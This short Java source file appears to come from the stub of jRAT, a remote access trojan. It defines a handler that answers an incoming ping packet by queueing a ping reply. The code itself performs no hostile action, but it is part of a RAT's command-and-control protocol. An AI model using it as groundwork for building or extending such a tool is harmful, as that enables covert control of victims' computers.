package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;
import se.jrat.stub.packets.outgoing.Packet0PingReply;

public class Packet0Ping extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		Connection.instance.addToSendQueue(new Packet0PingReply());
	}

}
